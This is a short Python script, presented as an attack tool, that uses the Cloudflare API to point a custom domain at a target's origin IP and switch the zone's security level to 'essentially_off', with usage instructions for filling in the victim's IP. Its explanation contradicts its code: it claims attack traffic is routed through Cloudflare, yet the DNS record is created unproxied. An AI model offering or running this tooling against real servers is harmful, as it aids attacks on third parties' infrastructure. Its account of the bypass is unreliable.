"""
# Script to Exploit Trust with Custom Cloudflare Accounts and Logging

This script demonstrates how attackers can exploit the trust relationship between Cloudflare and its customers by setting up a custom domain and disabling security features.

## Why This File Bypasses Cloudflare Security:
1. **Exploiting Trust**:
   - Attackers can create a custom domain pointing to the victim's IP address and disable security features.
   - This method exploits the trust relationship and routes attacks through Cloudflare’s infrastructure.

## Necessary Arguments:
1. **api_token**:
   - This is your Cloudflare API token. You can generate it in your Cloudflare account under the API Tokens section.
   - [How to get your API Token](https://developers.cloudflare.com/api/tokens/create/)

2. **zone_id**:
   - This is the unique identifier for your Cloudflare zone (domain). You can find it in the Overview tab of your domain in the Cloudflare dashboard.
   - [Finding your Zone ID](https://support.cloudflare.com/hc/en-us/articles/200168276-Where-do-I-find-my-Account-ID-and-Zone-ID-)

3. **domain_name**:
   - This is the custom domain name you will create or use under your Cloudflare account.
   - Make sure it is configured in your Cloudflare account.

4. **origin_ip**:
   - This is the IP address of the origin server you want to point to. This can be the target server's IP address.

## Usage:
- Replace `api_token`, `zone_id`, `domain_name`, and `origin_ip` with actual values.
- Ensure `requests` is installed: `pip install requests`.

## Code:
"""

import requests
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def setup_custom_domain(api_token, zone_id, domain_name, origin_ip):
    headers = {
        'Authorization': f'Bearer {api_token}',
        'Content-Type': 'application/json'
    }

    # Create a DNS A record pointing to origin IP
    dns_data = {
        'type': 'A',
        'name': domain_name,
        'content': origin_ip,
        'ttl': 1,
        'proxied': False
    }

    dns_response = requests.post(f'https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records', headers=headers,
                                 json=dns_data)

    if dns_response.status_code == 200:
        logging.info('DNS A record created successfully')
    else:
        logging.error(f'Failed to create DNS A record: {dns_response.json()}')

    # Disable security features
    security_data = {
        'value': 'essentially_off'
    }
    security_response = requests.patch(f'https://api.cloudflare.com/client/v4/zones/{zone_id}/settings/security_level',
                                       headers=headers, json=security_data)

    if security_response.status_code == 200:
        logging.info("Security features disabled successfully")
    else:
        logging.error(f'Failed to disable security features: {security_response.json()}')


if __name__ == '__main__':
    api_token = "YOUR CF TOKEN"
    zone_id = 'YOUR CF ZONE ID'
    domain_name = 'CUSTOM DOMAIN NAME'
    origin_ip = 'ORIGIN IP'

    setup_custom_domain(api_token, zone_id, domain_name, origin_ip)
